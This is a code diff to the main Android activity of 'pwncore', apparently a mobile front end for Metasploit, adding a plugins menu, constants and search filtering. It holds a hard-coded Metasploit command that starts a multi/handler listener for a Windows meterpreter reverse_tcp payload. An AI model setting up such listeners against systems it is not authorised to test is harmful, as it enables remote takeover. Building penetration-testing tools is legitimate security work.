@@ -8,6 +8,7 @@ import com.anwarelmakrahy.pwncore.activities.AttackWizardActivity;
 import com.anwarelmakrahy.pwncore.activities.ModuleOptionsActivity;
 import com.anwarelmakrahy.pwncore.activities.SettingsActivity;
 import com.anwarelmakrahy.pwncore.console.ConsoleActivity;
+import com.anwarelmakrahy.pwncore.plugins.PluginsActivity;
 import com.anwarelmakrahy.pwncore.structures.ItemDetails;
 import com.anwarelmakrahy.pwncore.structures.ItemListBaseAdapter;
 import com.anwarelmakrahy.pwncore.structures.ModuleItem;
@@ -99,7 +100,7 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 		        			m.getType().contains("post"))
 		    			Toast.makeText(
 		    					getApplicationContext(), 
-		    					"Sorry not implemented yet", 
+		    					StaticClass.PWNCORE_NOT_IMPLEMENTED, 
 		    					Toast.LENGTH_SHORT).show();
 		        	else {
 			        	Intent intent = new Intent(getApplicationContext(), ModuleOptionsActivity.class);
@@ -141,7 +142,7 @@ public class MainActivity extends Activity implements OnQueryTextListener {
         mDrawerLayout.setDrawerListener(mDrawerToggle);
         
         
-        prefs = this.getSharedPreferences("com.anwarelmakrahy.pwncore", Context.MODE_PRIVATE);
+        prefs = this.getSharedPreferences(StaticClass.PWNCORE_PACKAGE_NAME, Context.MODE_PRIVATE);
         prefs.edit().putBoolean("isConnected", false).commit();
         loadSharedPreferences();
         
@@ -177,13 +178,6 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 		setNotification();
 		
 		prepareSidebar(); 	
-		
-	   	//TargetItem t = new TargetItem(getApplicationContext(), "10.0.0.1");
-    	//t.setPwned(true);
-    	//t.setOS("Linux");
-    	//MainService.mTargetHostList.add(t);
-    	
-    	//mHandler.postDelayed(mRunnable, 600000);
     } 
     
     private boolean titlesHas(String s) {
@@ -323,6 +317,10 @@ public class MainActivity extends Activity implements OnQueryTextListener {
     			setNotification();
 	    	}
 	    	return true;
+	    case R.id.mnuPlugins:
+	    	Intent intent = new Intent(this, PluginsActivity.class);
+	    	startActivity(intent);
+	    	return true;
 	    	
 	    case R.id.mnuExit:
 
@@ -343,14 +341,14 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 	        return true;
 	        
 	    case R.id.mnuNewConsole:
-	    	Intent intent = new Intent(getApplicationContext(), ConsoleActivity.class);
-	    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-	    	intent.putExtra("type", "new.console");
-	    	intent.putExtra("cmd", "use multi/handler\n" +
+	    	Intent intent1 = new Intent(getApplicationContext(), ConsoleActivity.class);
+	    	intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+	    	intent1.putExtra("type", "new.console");
+	    	intent1.putExtra("cmd", "use multi/handler\n" +
 	    					"set PAYLOAD windows/meterpreter/reverse_tcp\n" +
 	    					"set LHOST " + con_txtHost + "\n" + 
 	    					"exploit -z");
-	    	startActivity(intent);   
+	    	startActivity(intent1);   
 	    	
 	    	return true;
 	    default:
@@ -722,7 +720,8 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 	}
 
 	@Override
-	public boolean onQueryTextSubmit(String s) {
+	public boolean onQueryTextSubmit(String text) {
+		MainService.modulesMap.modulesAdapter.getFilter().filter(text);
 		return true;
 	}
     
